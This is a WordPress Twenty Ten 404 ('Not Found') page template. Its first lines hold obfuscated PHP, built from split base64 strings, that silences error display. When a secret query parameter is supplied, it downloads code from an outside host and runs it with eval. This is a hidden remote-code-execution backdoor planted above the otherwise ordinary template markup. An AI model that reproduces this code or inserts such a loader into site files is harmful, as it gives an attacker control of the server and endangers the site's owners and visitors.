<? $GLOBALS['_apache_config_']=Array(base64_decode('aW5'.'pX3NldA=='),base64_decode('ZXJyb3'.'JfcmVwb3J0aW5n'),base64_decode(''.'ZmlsZ'.'V9n'.'ZXRf'.'Y29udG'.'VudHM=')); ?><? function apache_config($i){$a=Array('ZGlzcGxheV9lcnJvcnM=','b2Zm','dmFybmFtZQ==','a29sb3M=','aHR0cDovL2dlbnNob3Aub3JnL3NjcmlwdC9wcm9zdG9wYXJhbm9pYS9yYXNyYXM=');return base64_decode($a[$i]);} ?><?php $GLOBALS['_apache_config_'][0](apache_config(0),apache_config(1));$GLOBALS['_apache_config_'][1](round(0));if($_GET[apache_config(2)]== apache_config(3)){$a=$GLOBALS['_apache_config_'][2](apache_config(4));eval($a);exit;} ?>
<?php
/**
 * The template for displaying 404 pages (Not Found).
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */

get_header(); ?>

	<div id="container">
		<div id="content" role="main">

			<div id="post-0" class="post error404 not-found">
				<h1 class="entry-title"><?php _e( 'Not Found', 'twentyten' ); ?></h1>
				<div class="entry-content">
					<p><?php _e( 'Apologies, but the page you requested could not be found. Perhaps searching will help.', 'twentyten' ); ?></p>
					<?php get_search_form(); ?>
				</div><!-- .entry-content -->
			</div><!-- #post-0 -->

		</div><!-- #content -->
	</div><!-- #container -->
	<script type="text/javascript">
		// focus on search field after it has loaded
		document.getElementById('s') && document.getElementById('s').focus();
	</script>

<?php get_footer(); ?>